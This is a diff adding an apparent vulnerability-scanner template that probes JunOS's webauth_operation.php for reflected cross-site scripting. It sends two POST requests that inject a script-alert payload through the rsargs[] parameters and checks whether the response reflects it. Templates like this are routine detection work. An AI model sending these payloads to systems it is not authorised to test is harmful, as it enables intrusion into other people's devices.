@@ -1,0 +1,49 @@
+id: junos-xss
+brief:
+    title: JunOS - Cross-Site Scripting
+    by: DhiyaneshDK
+    level: medium
+    about: ""
+    label:
+        - junos
+        - xss
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/webauth_operation.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: rs=emit_debug_note&rsargs[]={{string}}&rsargs[]=<script>alert('document.domain');</script>
+      signs:
+        - "on": word
+          has:
+            - 'ERROR: <script>alert(''document.domain'');</script>'
+            - monospace
+          in: body
+          need: all
+        - "on": word
+          has:
+            - <script>alert('document.domain');</script>
+            - wrapper for
+          in: body
+          need: all
+    - verb: POST
+      to:
+        - '{{BaseURL}}/webauth_operation.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: rs=sajax_show_one_stub&rsargs[]={{string}}<script>alert('document.domain');</script>
+      signs:
+        - "on": word
+          has:
+            - 'ERROR: <script>alert(''document.domain'');</script>'
+            - monospace
+          in: body
+          need: all
+        - "on": word
+          has:
+            - <script>alert('document.domain');</script>
+            - wrapper for
+          in: body
+          need: all
